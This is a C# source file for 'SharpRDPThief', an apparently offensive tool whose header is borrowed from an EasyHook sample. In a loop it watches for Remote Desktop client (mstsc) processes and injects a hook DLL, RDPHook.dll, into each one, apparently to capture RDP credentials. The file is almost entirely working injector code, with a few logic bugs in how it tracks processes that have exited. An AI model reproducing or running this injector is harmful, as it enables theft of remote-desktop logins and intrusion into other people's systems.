// RemoteFileMonitor (File: FileMonitor\Program.cs)
//
// Copyright (c) 2017 Justin Stenning
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.
//
// Please visit https://easyhook.github.io for more information
// about the project, latest updates and other tutorials.

using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using System.ComponentModel;

namespace SharpRDPThief
{
    class Program
    {
        static void Main(string[] args)
        {
            Int32 targetPID = 0;
            string targetExe = null;

            // Will contain the name of the IPC server channel
            string channelName = null;

            //List of processes to check for mstsc
            List<Process> processes = new List<Process>();
            //List of PIDs to check if injected processes have exited
            List<int> PIDs = new List<int>();
            //Keep track of processes where we've already injected
            List<int> injectedProcesses = new List<int>();
            // Create the IPC server using the RDPHook IPC.ServiceInterface class as a singleton
            EasyHook.RemoteHooking.IpcCreateServer<RDPHook.ServerInterface>(ref channelName, System.Runtime.Remoting.WellKnownObjectMode.Singleton);

            // Get the full path to the assembly we want to inject into the target process
            string injectionLibrary = Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "RDPHook.dll");
            while (true)
            {
                //Reset list of PIDs and get processes
                PIDs.Clear();
                processes = Process.GetProcesses().ToList();
                for (int i = 0; i < processes.Count; i++)
                {
                    PIDs.Add(processes[i].Id);
                    //only inject if the process is mstsc and if we haven't already injected
                    if (processes[i].ProcessName == "mstsc" && injectedProcesses.IndexOf(processes[i].Id) == -1)
                    {
                        try
                        {
                            targetPID = processes[i].Id;
                            // Injecting into existing process by Id
                            Console.WriteLine("Attempting to inject into process {0}", targetPID);
                            // inject into existing process
                            EasyHook.RemoteHooking.Inject(
                                targetPID,          // ID of process to inject into
                                injectionLibrary,   // 32-bit library to inject (if target is 32-bit)
                                injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
                                channelName         // the parameters to pass into injected library
                                );
                            injectedProcesses.Add(processes[i].Id);

                        }
                        catch (Exception e)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("There was an error while injecting into target:");
                            Console.ResetColor();
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                //check if any of our injected processes have exited
                for(int i = 0; i < injectedProcesses.Count; i++)
                {
                    if(PIDs.IndexOf(injectedProcesses[i]) != -1)
                    {
                        injectedProcesses.Remove(i);
                    }
                }
                //sleep to avoid nuking the computer
                Thread.Sleep(3000);
                /*
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine("<Press any key to exit>");
                Console.ResetColor();
                Console.ReadKey();
                */
            }
        }
    }
}
